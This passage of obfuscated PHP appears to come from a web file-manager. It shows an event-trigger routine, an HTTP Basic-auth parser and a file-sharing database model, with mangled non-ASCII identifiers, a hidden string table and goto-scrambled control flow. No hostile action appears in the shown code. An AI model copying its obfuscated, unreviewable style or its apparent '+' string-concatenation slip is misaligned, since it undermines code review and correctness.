BÈÍØ—‘Ğ–: $fµæƒò´ó³ =& $_SERVER[¢à]; $F‰šÉ­™² = self::$events; if (!isset($F‰šÉ­™²[$C†“¦çÊİ])) { return $CÎ•œ÷‡«¬; } goto a¦©²±ë‹; e‚¹ù©ê×¹: } public static function trigger($fˆ¡ñøóß·) { goto Aªä”à‰Š; AÆîáŠÁ¬: return $E¶Ã•Óš¤·; goto dÍ¢Á‹‡Š¥; d¥ø™ÍÃÑË: $f¥¶÷«ÛÄÕ = func_get_args(); array_shift($f¥¶÷«ÛÄÕ); for ($cøÌàÃ¬¾‰ = 0; $cøÌàÃ¬¾‰ < count($bÆ ¦ó·Ğ); $cøÌàÃ¬¾‰++) { $a¤Áœ‡¥”Š = $bÆ ¦ó·Ğ[$cøÌàÃ¬¾‰]; if ($a¤Áœ‡¥”Š[$fãÀôÈäŞ†[1723]] && $a¤Áœ‡¥”Š[$fãÀôÈäŞ†[1724]] > 1) { continue; } if (defined($fãÀôÈäŞ†[1725]) && GLOBAL_LOG_HOOK) { write_log($fˆ¡ñøóß· . $fãÀôÈäŞ†[1726] . $a¤Áœ‡¥”Š[$fãÀôÈäŞ†[1722]], $fãÀôÈäŞ†[1727]); } self::$events[$fˆ¡ñøóß·][$cøÌàÃ¬¾‰][$fãÀôÈäŞ†[1724]] = $a¤Áœ‡¥”Š[$fãÀôÈäŞ†[1724]] + 1; $f¨‚Æ’­¤ = self::apply($a¤Áœ‡¥”Š[$fãÀôÈäŞ†[1722]], $f¥¶÷«ÛÄÕ); if (defined($fãÀôÈäŞ†[1725]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $fãÀôÈäŞ†[1727]); if ($a¤Áœ‡¥”Š[$fãÀôÈäŞ†[1724]] == 200) { $C‹ÕÄ¯•‰… = is_array($a¤Áœ‡¥”Š[$fãÀôÈäŞ†[1722]]) ? json_encode_force($a¤Áœ‡¥”Š[$fãÀôÈäŞ†[1722]]) : $a¤Áœ‡¥”Š[$fãÀôÈäŞ†[1722]]; write_log($fãÀôÈäŞ†[1728] . $fˆ¡ñøóß· . $fãÀôÈäŞ†[1729] . $C‹ÕÄ¯•‰…, $fãÀôÈäŞ†[1730]); } } $E¶Ã•Óš¤· = is_null($f¨‚Æ’­¤) ? $E¶Ã•Óš¤· : $f¨‚Æ’­¤; } goto AÆîáŠÁ¬; Aªä”à‰Š: $fãÀôÈäŞ† =& $_SERVER[¢à]; $d¥÷óªöâÕ = self::$events; $E¶Ã•Óš¤· = !1; goto EßÑ®ƒÆŠ; EßÑ®ƒÆŠ: if (!isset($d¥÷óªöâÕ[$fˆ¡ñøóß·])) { return $E¶Ã•Óš¤·; } $bÆ ¦ó·Ğ = $d¥÷óªöâÕ[$fˆ¡ñøóß·]; if (!is_array($bÆ ¦ó·Ğ) || count($bÆ ¦ó·Ğ) == 0) { return $E¶Ã•Óš¤·; } goto d¥ø™ÍÃÑË; dÍ¢Á‹‡Š¥: } } class HttpAuth { public static function get() { $e¼±ÍÕ‚¶ù =& $_SERVER[¢à]; $A›®Ò‡˜ì« = $e¼±ÍÕ‚¶ù[33]; $aí²íÎêø£ = $e¼±ÍÕ‚¶ù[33]; if (isset($_SERVER[$e¼±ÍÕ‚¶ù[1731]])) { $A›®Ò‡˜ì« = $_SERVER[$e¼±ÍÕ‚¶ù[1731]]; $aí²íÎêø£ = $_SERVER[$e¼±ÍÕ‚¶ù[1732]]; } elseif (isset($_SERVER[$e¼±ÍÕ‚¶ù[1733]])) { $cùãöğĞ¹ = $_SERVER[$e¼±ÍÕ‚¶ù[1733]]; if (strpos(strtolower($cùãöğĞ¹), $e¼±ÍÕ‚¶ù[1734]) === 0) { $DğÙÍ½ğ“® = explode($e¼±ÍÕ‚¶ù[4], base64_decode(substr($cùãöğĞ¹, 6))); $A›®Ò‡˜ì« = isset($DğÙÍ½ğ“®[0]) ? $DğÙÍ½ğ“®[0] : $e¼±ÍÕ‚¶ù[33]; $aí²íÎêø£ = isset($DğÙÍ½ğ“®[1]) ? $DğÙÍ½ğ“®[1] : 0; } } return array($e¼±ÍÕ‚¶ù[531] => $A›®Ò‡˜ì«, $e¼±ÍÕ‚¶ù[895] => $aí²íÎêø£); } public static function error() { goto FŞ®¶…Ä»½; bÌ’ÂÆÏ¢: die; goto b¶êßË®Ÿ; FŞ®¶…Ä»½: $D©‹ÂÎàË =& $_SERVER[¢à]; header($D©‹ÂÎàË[1735]); header($D©‹ÂÎàË[1736]); goto Eï× ßËÀ¡; Eï× ßËÀ¡: header($D©‹ÂÎàË[1737]); header($D©‹ÂÎàË[1738]); header($D©‹ÂÎàË[1252]); goto bÌ’ÂÆÏ¢; b¶êßË®Ÿ: } public static function make($c§É²ëõÊß, $b›âªö†¯Ÿ) { $B½—Ó˜Š÷¶ =& $_SERVER[¢à]; return $B½—Ó˜Š÷¶[1739] + base64_encode($c§É²ëõÊß . $B½—Ó˜Š÷¶[4] . $b›âªö†¯Ÿ); } } goto FòÍŞÂËÎ; F¼¼ÂíîòŞ: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\145"; protected $dataAuto = array(array("\x6d\157\144\151\146\x79\x54\151\155\145", "\x74\151\155\x65", "\x69\156\163\145\162\164\x2c\165\160\144\141\164\x65", "\146\x75\x6e\143\x74\151\157\156"), array("\x63\162\145\141\164\145\124\151\x6d\145", "\164\151\x6d\145", "\151\156\163\x65\x72\x74", "\x66\165\156\143\164\151\x6f\156"), array("\157\x70\164\151\x6f\x6e\x73", '', "\151\x6e\x73\145\x72\164\54\165\x70\x64\141\164\x65\54\x73\145\154\145\x63\164", "\152\163\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($D¶¸Ü·š¾) { $A¢•ƒç½Ñƒ =& $_SERVER[¢à]; $c‰êÂª·ˆ‰ = isset($D¶¸Ü·š¾[0]) ? $D¶¸Ü·š¾[0] : !1; return array($A¢•ƒç½Ñƒ[2180] => array(USER_ID, $A¢•ƒç½Ñƒ[2181]), $A¢•ƒç½Ñƒ[2143] => array($c‰êÂª·ˆ‰, $A¢•ƒç½Ñƒ[2182])); } protected function listSimple() { $C­˜Õä‡äâ = array($_SERVER[¢à][1412] => USER_ID); $B˜—…éÃ = $this->field($this->fieldList)->where($C­˜Õä‡äâ)->select(); return $B˜—…éÃ ? $B˜—…éÃ : array(); } protected function getInfo($dêÄÖƒÈöÆ, $E°Ø»ôˆ‹ã = false) { $FÅÀÓæ‚Ò™ =& $_SERVER[¢à]; if ($E°Ø»ôˆ‹ã) { return $this->_getShareInfo(array($FÅÀÓæ‚Ò™[437] => $dêÄÖƒÈöÆ)); } $B’¢³æ¤Ëø = $this->cacheFunctionGet($FÅÀÓæ‚Ò™[2183], $dêÄÖƒÈöÆ); return $B’¢³æ¤Ëø; } public function getInfoByHash($bå“š§ÛŞë) { return $this->_getShareInfo(array($_SERVER[¢à][439] => $bå“š§ÛŞë)); } public function getInfoByPath($f´ë½Úô¦¡) { $B´ö‘ğ’ =& $_SERVER[¢à]; $AƒÎ¨ íŠŠ = array($B´ö‘ğ’[1412] => USER_ID, $B´ö‘ğ’[366] => $f´ë½Úô¦¡); return $this->_getShareInfo($AƒÎ¨ íŠŠ); } public function getInfoBySourcePath($fÕ“´‡é¡) { $d¼³¯ÔÆÁñ =& $_SERVER[¢à]; $aºåÙ„ÎÕ = array($d¼³¯ÔÆÁñ[1412] => USER_ID, $d¼³¯ÔÆÁñ[1014] => $fÕ“´‡é¡); return $this->_getShareInfo($aºåÙ„ÎÕ); } private function _getShareInfo($FëŒ¥ŸÖÃô) { goto E±‘‡°º¿â; b¡…Í»–¥Ï: if ($F÷ŞõíÕŒñ[$dÑïãÃíªÎ[366]] == $dÑïãÃíªÎ[464]) { $F÷ŞõíÕŒñ[$dÑïãÃíªÎ[388]] = IO::info($F÷ŞõíÕŒñ[$dÑïãÃíªÎ[1014]]); } else { $F÷ŞõíÕŒñ[$dÑïãÃíªÎ[388]] = Model($dÑïãÃíªÎ[1106])->pathInfo($F÷ŞõíÕŒñ[$dÑïãÃíªÎ[366]]); } $F÷ŞõíÕŒñ[$dÑïãÃíªÎ[2185]] = $cç£À¾ÓÅ; return $F÷ŞõíÕŒñ; goto A’Á«Ê¡³«; E±‘‡°º¿â: $dÑïãÃíªÎ =& $_SERVER[¢à]; $F÷ŞõíÕŒñ = $this->where($FëŒ¥ŸÖÃô)->find(); if (!$F÷ŞõíÕŒñ) { return !1; } goto B”Âï„Ş£; B”Âï„Ş£: $FëŒ¥ŸÖÃô = array($dÑïãÃíªÎ[437] => $F÷ŞõíÕŒñ[$dÑïãÃíªÎ[437]]); $Aµ°ÎƒÆÒÆ = $dÑïãÃíªÎ[2184]; $cç£À¾ÓÅ = Model($dÑïãÃíªÎ[533])->order($dÑïãÃíªÎ[364])->field($Aµ°ÎƒÆÒÆ)->where($FëŒ¥ŸÖÃô)->select(); goto b¡…Í»–¥Ï; A’Á«Ê¡³«: } protected function getInfoAuth($Aäµ»åâ¸) { $bÀ±¯Ò ¸ª =& $_SERVER[¢à]; $bÀ‘š½˜â™ = $this->getInfo($Aäµ»åâ¸); $bÀ‘š½˜â™[$bÀ±¯Ò ¸ª[373]] = Model($bÀ±¯Ò ¸ª[450])->authMake($bÀ‘š½˜â™[$bÀ±¯Ò ¸ª[2185]]); return $bÀ‘š½˜â™; } protected function listData($E›¼÷”Òó = null, $EÓŸˆÍÓ©¡ = 300) { $eÇ’İ‰íöŒ =& $_SERVER[¢à]; $C«àïÖ…  = array(array($eÇ’İ‰íöŒ[442] => array($eÇ’İ‰íöŒ[924], 0), $eÇ’İ‰íöŒ[444] => array($eÇ’İ‰íöŒ[924], 0), $eÇ’İ‰íöŒ[2186] => $eÇ’İ‰íöŒ[2155])); if ($E›¼÷”Òó == $eÇ’İ‰íöŒ[1842]) { $C«àïÖ…  = array($eÇ’İ‰íöŒ[442] => 1); } else { if ($E›¼÷”Òó == $eÇ’İ‰íöŒ[1003]) { $C«àïÖ…  = array($eÇ’İ‰íöŒ[444] => 1); } } $C«àïÖ… [$eÇ’İ‰íöŒ[1412]] = USER_ID; $Eˆ••šŸÂ = $this->where($C«àïÖ… )->selectPage($EÓŸˆÍÓ©¡); return $Eˆ••šŸÂ; } protected function listToMe($aİ¥÷İô™ = 300) { goto E¦‡£ÎàĞæ; E¦‡£ÎàĞæ: $Bæ£²‡ã… =& $_SERVER[¢à]; $AÌ¾ŞËŠ­ = Session::get($Bæ£²‡ã…[2187]); $e†Æ¦Íö = array_to_keyvalue($AÌ¾ŞËŠ­, $Bæ£²‡ã…[33], $Bæ£²‡ã…[2075]); goto CÈ‰×Ìâ¬À; CÈ‰×Ìâ¬À: $b‚íİ”ñªÖ = array($Bæ£²‡ã…[517] => SourceModel::TYPE_USER, $Bæ£²‡ã…[452] => USER_ID); if ($e†Æ¦Íö) { $b‚íİ”ñªÖ = array(array($Bæ£²‡ã…[517] => SourceModel::TYPE_USER, $Bæ£²‡ã…[452] => USER_ID), array($Bæ£²‡ã…[517] => SourceModel::TYPE_GROUP, $Bæ£²‡ã…[452] => array($Bæ£²‡ã…[7], $e†Æ¦Íö)), $Bæ£²‡ã…[2186] => $Bæ£²‡ã…[2155]); } $fì»À©ğ = Model($Bæ£²‡ã…[533])->where($b‚íİ”ñªÖ)->selectPage($aİ¥÷İô™); goto dËé» Úê; dËé» Úê: $EñŠ¬²Ë…Ş = array_to_keyvalue_group($fì»À©ğ[$Bæ£²‡ã…[351]], $Bæ£²‡ã…[437]); if (!$EñŠ¬²Ë…Ş) { return $fì»À©ğ; } $BöîÍµ†ˆ = $Bæ£²‡ã…[2188]; goto EµŸâ´†Ìë; D¬¸•¯ãÒ: $A“ÒË½¼†Å = array($Bæ£²‡ã…[2189] => $bãöó†, $Bæ£²‡ã…[2190] => $fì»À©ğ[$Bæ£²‡ã…[348]]); return $A“ÒË½¼†Å; goto DÜ«î÷‹çŸ; EµŸâ´†Ìë: $b‚íİ”ñªÖ = array($Bæ£²‡ã…[437] => array($Bæ£²‡ã…[381], array_keys($EñŠ¬²Ë…Ş))); $bãöó† = $this->field($BöîÍµ†ˆ)->where($b‚íİ”ñªÖ)->select(); foreach ($bãöó† as $b£¾ÅÄØµ => &$f¹±…×¿¨Ä) { $f¹±…×¿¨Ä[$Bæ£²‡ã…[2185]] = $EñŠ¬²Ë…Ş[$f¹±…×¿¨Ä[$Bæ£²‡ã…[437]]]; } goto D¬¸•¯ãÒ; DÜ«î÷‹çŸ: } protected function shareAdd($A¯ª•À¬Ú, $E±›Å©Àä) { $f£ŠÁñÁ… =& $_SERVER[¢à]; $fÇ¬ÜóõÆ = $this->_addShareData($A¯ª•À¬Ú, $E±›Å©Àä); if (!empty($E±›Å©Àä[$f£ŠÁñÁ…[2191]])) { $this->_shareAuthSet($fÇ¬ÜóõÆ, $E±›Å©Àä[$f£ŠÁñÁ…[2191]]); } $this->shareEventAdd($A¯ª•À¬Ú, $E±›Å©Àä, $f£ŠÁñÁ…[1006]); return $fÇ¬ÜóõÆ; } private function shareEventAdd($b©Œø§†µ£, $B«Û½Ô, $döŒ¶Ïİºø = "\141\x64\144") { goto C÷óãˆÆ±Ú; C÷óãˆÆ±Ú: $C¨¨ù•ÅÚ® =& $_SERVER[¢à]; if ($döŒ¶Ïİºø == $C¨¨ù•ÅÚ®[1006]) { if ($B«Û½Ô[$C¨¨ù•ÅÚ®[442]] == $C¨¨ù•ÅÚ®[83]) { Model($C¨¨ù•ÅÚ®[501])->eventShare($b©Œø§†µ£, $C¨¨ù•ÅÚ®[2192]); } if ($B«Û½Ô[$C¨¨ù•ÅÚ®[444]] == $C¨¨ù•ÅÚ®[83]) { Model($C¨¨ù•ÅÚ®[501])->eventShare($b©Œø§†µ£, $C¨¨ù•ÅÚ®[2193]); } return; } $BƒÉ„ñôÀ³ = $this->getInfoByPath($b©Œø§†µ£); goto eµÒ‰÷Ä­œ; eµÒ‰÷Ä­œ: $D Åå¼“” = $C¨¨ù•ÅÚ®[2194]; if ($BƒÉ„ñôÀ³[$C¨¨ù•ÅÚ®[442]] == $C¨¨ù•ÅÚ®[464] && $B«Û½Ô[$C¨¨ù•ÅÚ®[442]] == $C¨¨ù•ÅÚ®[83]) { $D Åå¼“” = $C¨¨ù•ÅÚ®[2192]; } if ($BƒÉ„ñôÀ³[$C¨¨ù•ÅÚ®[442]] == $C¨¨ù•ÅÚ®[83] && $B«Û½Ô[$C¨¨ù•ÅÚ®[442]] == $C¨¨ù•ÅÚ®[464]) { $D Åå¼“” = $C¨¨ù•ÅÚ®[2195]; } goto BŒÅ¹Ûô‚¤; BŒÅ¹Ûô‚¤: if ($BƒÉ„ñôÀ³[$C¨¨ù•ÅÚ®[444]] == $C¨¨ù•ÅÚ®[464] && $B«Û½Ô[$C¨¨ù•ÅÚ®[444]] == $C¨¨ù•ÅÚ®[83]) { $D Åå¼“” = $C¨¨ù•ÅÚ®[2193]; } if ($BƒÉ„ñôÀ³[$C¨¨ù•ÅÚ®[444]] == $C¨¨ù•ÅÚ®[83] && $B«Û½Ô[$C¨¨ù•ÅÚ®[444]] == $C¨¨ù•ÅÚ®[464]) { $D Åå¼“” = $C¨¨ù•ÅÚ®[2196]; } Model($C¨¨ù•ÅÚ®[501])->eventShare($b©Œø§†µ£, $D Åå¼“”); goto cºŠĞÓêƒ; cºŠĞÓêƒ: return; goto eâÏ–¼¿¯ô; eâÏ–¼¿¯ô: } private function _addShareData($c‰„ŸæÃ½•, $E©ä„À¢º = array()) { goto aªÇÍà®À§; Aµïø–…Æˆ: $d‡Ö¢¡„ = array($B´¡îÄÖ¸™[1403] => USER_ID, $B´¡îÄÖ¸™[380] => $c‰„ŸæÃ½•, $B´¡îÄÖ¸™[1317] => $B´¡îÄÖ¸™[33], $B´¡îÄÖ¸™[442] => 0, $B´¡îÄÖ¸™[444] => 0, $B´¡îÄÖ¸™[1014] => $B´¡îÄÖ¸™[33], $B´¡îÄÖ¸™[292] => $B´¡îÄÖ¸™[33], $B´¡îÄÖ¸™[800] => $B´¡îÄÖ¸™[33], $B´¡îÄÖ¸™[2198] => 0, $B´¡îÄÖ¸™[2199] => 0, $B´¡îÄÖ¸™[703] => 0, $B´¡îÄÖ¸™[2200] => $B´¡îÄÖ¸™[33], $B´¡îÄÖ¸™[439] => $B´¡îÄÖ¸™[33]); $FïÜ•¶Ääì = explode($B´¡îÄÖ¸™[47], $B´¡îÄÖ¸™[2201]); foreach ($FïÜ•¶Ääì as $E¸Œô¢¸†ˆ) { if (!isset($E©ä„À¢º[$E¸Œô¢¸†ˆ])) { continue; } $d‡Ö¢¡„[$E¸Œô¢¸†ˆ] = $E©ä„À¢º[$E¸Œô¢¸†ˆ]; } goto d‰’óØ¼˜ã; bÑÂó Áˆè: return $fØÚ…á®¼â; goto D‘ƒ‡Ö…Ã; d‰’óØ¼˜ã: $fØÚ…á®¼â = $this->add($d‡Ö¢¡„); $E™ö·«ä¡ = array($B´¡îÄÖ¸™[439] => short_id($fØÚ…á®¼â)); $this->where(array($B´¡îÄÖ¸™[436] => $fØÚ…á®¼â))->save($E™ö·«ä¡); goto bÑÂó Áˆè; aªÇÍà®À§: $B´¡îÄÖ¸™ =& $_SERVER[¢à]; $cë§Íêåô¯ = array($B´¡îÄÖ¸™[380] => $c‰„ŸæÃ½•, $B´¡îÄÖ¸™[1403] => USER_ID); if ($c‰„ŸæÃ½• == 0) { $cë§Íêåô¯ = array($B´¡îÄÖ¸™[2197] => $E©ä„À¢º[$B´¡îÄÖ¸™[1014]], $B´¡îÄÖ¸™[1403] => USER_ID); } goto d´Óëâ´´•; d´Óëâ´´•: if ($e™â‘ë‹¹– = $this->where($cë§Íêåô¯)->find()) { return $e™â‘ë‹¹–[$B´¡îÄÖ¸™[437]]; } if ($c‰„ŸæÃ½• == 0) { $a‹¾…×Œ£™ = array($B´¡îÄÖ¸™[28] => get_path_this($E©ä„À¢º[$B´¡îÄÖ¸™[75]])); } else { $a‹¾…×Œ£™ = Model($B´¡îÄÖ¸™[752])->sourceInfo($c‰„ŸæÃ½•); if (!$a‹¾…×Œ£™) { return !1; } } if (!$E©ä„À¢º[$B´¡îÄÖ¸™[1317]]) { $E©ä„À¢º[$B´¡îÄÖ¸™[1317]] = $a‹¾…×Œ£™[$B´¡îÄÖ¸™[28]]; } goto Aµïø–…Æˆ; D‘ƒ‡Ö…Ã: } private function _shareAuthSet($câÔ×Ó‹±, $F’»ºÑÕ©) { goto b®§ÎØÔ; d“Æ¯ÔÇ¬©: return $aÙá…Ú‰->addAll($CôÂ«à¨·, array(), !0); goto E¯ÓÔù¹à; EŒ¦²ôšŸ½: $aÙá…Ú‰->where(array($d×Éä›İÜ»[437] => $câÔ×Ó‹±))->delete(); $CôÂ«à¨· = array(); foreach ($F’»ºÑÕ© as $CÙØ¤´³ƒæ) { $E©ËÛÒ»¹ = SourceModel::TYPE_USER; if ($CÙØ¤´³ƒæ[$d×Éä›İÜ»[368]] == SourceModel::TYPE_GROUP) { $E©ËÛÒ»¹ = SourceModel::TYPE_GROUP; } $a¤†È÷­àÀ = array($d×Éä›İÜ»[437] => $câÔ×Ó‹±, $d×Éä›İÜ»[368] => $E©ËÛÒ»¹, $d×Éä›İÜ»[452] => intval($CÙØ¤´³ƒæ[$d×Éä›İÜ»[452]]), $d×Éä›İÜ»[2203] => 0, $d×Éä›İÜ»[2204] => -1); if ($CÙØ¤´³ƒæ[$d×Éä›İÜ»[2203]]) { $a¤†È÷­àÀ[$d×Éä›İÜ»[2203]] = $CÙØ¤´³ƒæ[$d×Éä›İÜ»[2203]]; } else { if ($CÙØ¤´³ƒæ[$d×Éä›İÜ»[2204]]) { $a¤†È÷­àÀ[$d×Éä›İÜ»[2204]] = $CÙØ¤´³ƒæ[$d×Éä›İÜ»[2204]]; } } $CôÂ«à¨·[] = $a¤†È÷­àÀ; } goto d“Æ¯ÔÇ¬©; b®§ÎØÔ: $d×Éä›İÜ» =& $_SERVER[¢à]; if (!is_array($F’»ºÑÕ©)) { return !1; } $aÙá…Ú‰ = Model($d×Éä›İÜ»[2202]); goto EŒ¦²ôšŸ½; E¯ÓÔù¹à: } public function numViewAdd($câ»ß¯‹öï) { $Cªˆõ‚¢—„ =& $_SERVER[¢à]; $fŒÛ§Â²Ç™ = array($Cªˆõ‚¢—„[436] => $câ»ß¯‹öï); $this->where($fŒÛ§Â²Ç™)->setAdd($Cªˆõ‚¢—„[2198]); } public function numDownloadAdd($B×¡ŞŠÓÍÈ) { $Aä×–¢Ğªˆ =& $_SERVER[¢à]; $EÕ¡ïØç… = array($Aä×–¢Ğªˆ[436] => $B×¡ŞŠÓÍÈ); $this->where($EÕ¡ïØç…)->setAdd($Aä×–¢Ğªˆ[2199]); } protected function shareEdit($aôä‹µ™ò÷, $aç«¦ºîšŸ) { goto b«Òí¼Ó‰‰; b«Òí¼Ó‰‰: $B¨ŞÛ•–ÄÎ =& $_SERVER[¢à]; $aé¨õç¦ä© = $this->getInfo($aôä‹µ™ò÷); if (!$aé¨õç¦ä©) { return !1; } goto c¾‘ÃÏ‚ŒÅ; fõ…ªé¾¯: foreach ($A‹¸•¾ì«† as $e†‚ôêÖÓ) { if (!array_key_exists($e†‚ôêÖÓ, $aç«¦ºîšŸ)) { continue; } $B±øÛù«ª[$e†‚ôêÖÓ] = $aç«¦ºîšŸ[$e†‚ôêÖÓ]; } $this->shareEventAdd($aé¨õç¦ä©[$B¨ŞÛ•–ÄÎ[366]], $aç«¦ºîšŸ, $B¨ŞÛ•–ÄÎ[2043]); $this->where(array($B¨ŞÛ•–ÄÎ[436] => $aôä‹µ™ò÷))->save($B±øÛù«ª); goto E®ŸùøĞ§”; E®ŸùøĞ§”: if (isset($aç«¦ºîšŸ[$B¨ŞÛ•–ÄÎ[2191]])) { $this->_shareAuthSet($aôä‹µ™ò÷, $aç«¦ºîšŸ[$B¨ŞÛ•–ÄÎ[2191]]); } return !0; goto FàÒ‚ƒŒ§ë; c¾‘ÃÏ‚ŒÅ: $this->_checkLinkShare($aç«¦ºîšŸ, $aé¨õç¦ä©); $B±øÛù«ª = array(); $A‹¸•¾ì«† = explode($B¨ŞÛ•–ÄÎ[47], $B¨ŞÛ•–ÄÎ[2205]); goto fõ…ªé¾¯; FàÒ‚ƒŒ§ë: } private function _checkLinkShare($däïæå‘’Š, $aÏ…ÀÏÍÈ’) { goto DóßÙåŒÚ; DóßÙåŒÚ: $c½®‹­²«† =& $_SERVER[¢à]; if ($däïæå‘’Š[$c½®‹­²«†[442]] != $c½®‹­²«†[83]) { return; } $fàÊ÷àÙ­£ = $aÏ…ÀÏÍÈ’[$c½®‹­²«†[388]][$c½®‹­²«†[366]]; goto CËŞÈø·Ÿ; Cá”¢Ü…Äª: $d²ÄŒˆÌ‡ = $this->shareFileMeta($EŞ™ÙØ§»[$c½®‹­²«†[415]]); if (isset($d²ÄŒˆÌ‡[$c½®‹­²«†[356]]) && $d²ÄŒˆÌ‡[$c½®‹­²«†[356]] == $c½®‹­²«†[83]) { show_json(LNG($c½®‹­²«†[2208]), !1); } goto aƒäÍ•ï¢; CËŞÈø·Ÿ: if ($aÏ…ÀÏÍÈ’[$c½®‹­²«†[388]][$c½®‹­²«†[29]] != $c½®‹­²«†[164]) { $d¬ƒñ¦µ‡— = $this->_folderReport($fàÊ÷àÙ­£); if (!$d¬ƒñ¦µ‡—) { return; } show_json(LNG($c½®‹­²«†[2206]) . $c½®‹­²«†[2207] . $d¬ƒñ¦µ‡—, !1); } $EŞ™ÙØ§» = Model($c½®‹­²«†[752])->fileInfoGet($aÏ…ÀÏÍÈ’[$c½®‹­²«†[388]][$c½®‹­²«†[366]]); if (!$EŞ™ÙØ§») { return; } goto Cá”¢Ü…Äª; aƒäÍ•ï¢: } private function _folderReport($cá¨‘“Ûôò) { goto bôŒ¾¼×“ñ; f»œåÀ·ã: if (!$d¡ŠÓ´“³Ù) { return !1; } $d¡ŠÓ´“³Ù = array_to_keyvalue($d¡ŠÓ´“³Ù, $CÈÒëéÓáª[33], $CÈÒëéÓáª[415]); $cº—°¾ƒ = $CÈÒëéÓáª[47] . $cá¨‘“Ûôò . $CÈÒëéÓáª[47]; goto CØºÌÓ­…ê; bôŒ¾¼×“ñ: $CÈÒëéÓáª =& $_SERVER[¢à]; $Dø„‹ƒĞÇÙ = array($CÈÒëéÓáª[415] => array($CÈÒëéÓáª[924], 0), $CÈÒëéÓáª[689] => 3); $d¡ŠÓ´“³Ù = Model($CÈÒëéÓáª[2209])->where($Dø„‹ƒĞÇÙ)->field($CÈÒëéÓáª[415])->select(); goto f»œåÀ·ã; CØºÌÓ­…ê: $Dø„‹ƒĞÇÙ = array($CÈÒëéÓáª[415] => array($CÈÒëéÓáª[7], $d¡ŠÓ´“³Ù), $CÈÒëéÓáª[455] => array($CÈÒëéÓáª[751], "\x25{$cº—°¾ƒ}\45"), $CÈÒëéÓáª[393] => 0); $FãˆªÕ¶Û = Model($CÈÒëéÓáª[752])->where($Dø„‹ƒĞÇÙ)->field($CÈÒëéÓáª[2210])->find(); if (!$FãˆªÕ¶Û) { return !1; } goto C©µ©èÁÆÏ; Cë¿„öÜ…—: $d¦´¢Î‡¬ = array_to_keyvalue($CªÅª˜ÀèÇ, $CÈÒëéÓáª[33], $CÈÒëéÓáª[28]); $d¦´¢Î‡¬[] = $FãˆªÕ¶Û[$CÈÒëéÓáª[28]]; return implode($CÈÒëéÓáª[8], $d¦´¢Î‡¬); goto D‘ãğ–˜–Ü; C©µ©èÁÆÏ: $dŠÄÖîØñ = substr($FãˆªÕ¶Û[$CÈÒëéÓáª[455]], strpos($FãˆªÕ¶Û[$CÈÒëéÓáª[455]], $cº—°¾ƒ)); $Dø„‹ƒĞÇÙ = array($CÈÒëéÓáª[366] => array($CÈÒëéÓáª[7], trim($dŠÄÖîØñ, $CÈÒëéÓáª[47]))); $CªÅª˜ÀèÇ = Model($CÈÒëéÓáª[752])->where($Dø„‹ƒĞÇÙ)->field($CÈÒëéÓáª[28])->select(); goto Cë¿„öÜ…—; D‘ãğ–˜–Ü: } protected function remove($D‡ñ®ÚÅ¹´) { goto B‚é¨¥à; D»¾çñ†µ¼: for ($FÉÁÒÚÇè = 0; $FÉÁÒÚÇè < count($cáõà²Ëù™); $FÉÁÒÚÇè++) { $DÍ°®ˆ‘ôÙ = $this->getInfo($cáõà²Ëù™[$FÉÁÒÚÇè]); if ($DÍ°®ˆ‘ôÙ[$c©ª¨’„Ş…[444]] == $c©ª¨’„Ş…[83]) { Model($c©ª¨’„Ş…[501])->eventShare($DÍ°®ˆ‘ôÙ[$c©ª¨’„Ş…[366]], $c©ª¨’„Ş…[2196]); } if ($DÍ°®ˆ‘ôÙ[$c©ª¨’„Ş…[442]] == $c©ª¨’„Ş…[83]) { Model($c©ª¨’„Ş…[501])->eventShare($DÍ°®ˆ‘ôÙ[$c©ª¨’„Ş…[366]], $c©ª¨’„Ş…[2195]); } } return $F±ÚÌô‰Æî; goto A°µÖäŒŠŠ; C¦Ÿâˆ’Ê: $F±ÚÌô‰Æî = $this->where($BØ¤‡‰íÛ)->delete(); if ($F±ÚÌô‰Æî) { Model($c©ª¨’„Ş…[533])->where(array($c©ª¨’„Ş…[437] => $D‡ñ®ÚÅ¹´))->delete(); } $cáõà²Ëù™ = is_array($D‡ñ®ÚÅ¹´) ? $D‡ñ®ÚÅ¹´[1] : array($D‡ñ®ÚÅ¹´); goto D»¾çñ†µ¼; B‚é¨¥à: $c©ª¨’„Ş… =& $_SERVER[¢à]; if (is_array($D‡ñ®ÚÅ¹´)) { $D‡ñ®ÚÅ¹´ = array($c©ª¨’„Ş…[7], $D‡ñ®ÚÅ¹´); } $BØ¤‡‰íÛ = array($c©ª¨’„Ş…[437] => $D‡ñ®ÚÅ¹´); goto C¦Ÿâˆ’Ê; A°µÖäŒŠŠ: } protected function removeBySource($d®“À‡‡Åµ) { goto Aš¦¡ˆ÷ëå; fØ‘ª¯ò¹ä: $this->where($D†íÇ‰¦‘æ)->delete(); Model($F­­Ì¡ª[533])->where($D†íÇ‰¦‘æ)->delete(); goto DÖ½Ö˜¤…«; e¤§±Öà: $E×µ£ºîæÓ = array_to_keyvalue($E×µ£ºîæÓ, $F­­Ì¡ª[33], $F­­Ì¡ª[437]); if (!$E×µ£ºîæÓ) { return; } $D†íÇ‰¦‘æ = array($F­­Ì¡ª[436] => array($F­­Ì¡ª[381], $E×µ£ºîæÓ)); goto fØ‘ª¯ò¹ä; Aš¦¡ˆ÷ëå: $F­­Ì¡ª =& $_SERVER[¢à]; $D†íÇ‰¦‘æ = array($F­­Ì¡ª[380] => array($F­­Ì¡ª[381], $d®“À‡‡Åµ)); $E×µ£ºîæÓ = $this->field($F­­Ì¡ª[437])->where($D†íÇ‰¦‘æ)->select(); goto e¤§±Öà; DÖ½Ö˜¤…«: } public function listAll($dˆÁŞ°†äÑ) { goto F¨Ìö£äºÌ; E¤œÁã„ÍÀ: $FÃğã›’…Œ = $this->_makeOrder()->where($b„ÛÔà‚Ğç)->selectPage(20); if (empty($FÃğã›’…Œ[$bÈÂÀ×Ö¢[351]])) { return array(); } $this->_listDataApply($FÃğã›’…Œ[$bÈÂÀ×Ö¢[351]]); goto bÓÈÖÄâŒ; bÓÈÖÄâŒ: return $FÃğã›’…Œ; goto BÒ®¦ì»; F¨Ìö£äºÌ: $bÈÂÀ×Ö¢ =& $_SERVER[¢à]; $b„ÛÔà‚Ğç = array(); if ($dˆÁŞ°†äÑ[$bÈÂÀ×Ö¢[1412]]) { $b„ÛÔà‚Ğç[$bÈÂÀ×Ö¢[1412]] = $dˆÁŞ°†äÑ[$bÈÂÀ×Ö¢[1412]]; } goto FØõÆˆÌ‹§; FØõÆˆÌ‹§: if 